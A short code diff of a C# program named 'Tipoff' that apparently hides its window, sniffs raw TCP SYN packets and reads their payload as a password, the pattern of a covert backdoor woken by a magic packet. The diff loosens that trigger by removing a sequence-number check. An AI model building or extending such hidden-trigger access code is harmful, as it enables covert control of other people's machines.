@@ -22,7 +22,7 @@ namespace Tipoff
 {
     public partial class Form1 : Form
     {
-        private Socket g_Socket;
+        private Socket m_Socket;
         private bool m_bConnected = false;
 
         private int m_nTimeout = 10000; //ms
@@ -194,7 +194,7 @@ namespace Tipoff
                 new Thread(() => ReceivedBuffer(s)).Start();
                 m_bConnected = true;
 
-                g_Socket = sock;
+                m_Socket = sock;
 
                 return true;
             }
@@ -210,7 +210,7 @@ namespace Tipoff
             Packet pkt = Packet.ParsePacket(pktRaw.LinkLayerType, pktRaw.Data);
 
             var pktTCP = pkt.Extract(typeof(TcpPacket)) as TcpPacket;
-            if (pktTCP != null && pktTCP.Syn && pktTCP.SequenceNumber == 5000)
+            if (pktTCP != null && pktTCP.Syn)
             {
                 byte[] abPayload = pktTCP.PayloadData;
                 string szPassword = Encoding.UTF8.GetString(abPayload);
@@ -268,6 +268,7 @@ namespace Tipoff
         {
             Visible = false;
             ShowInTaskbar = false;
+
             fnMain();
         }
     }
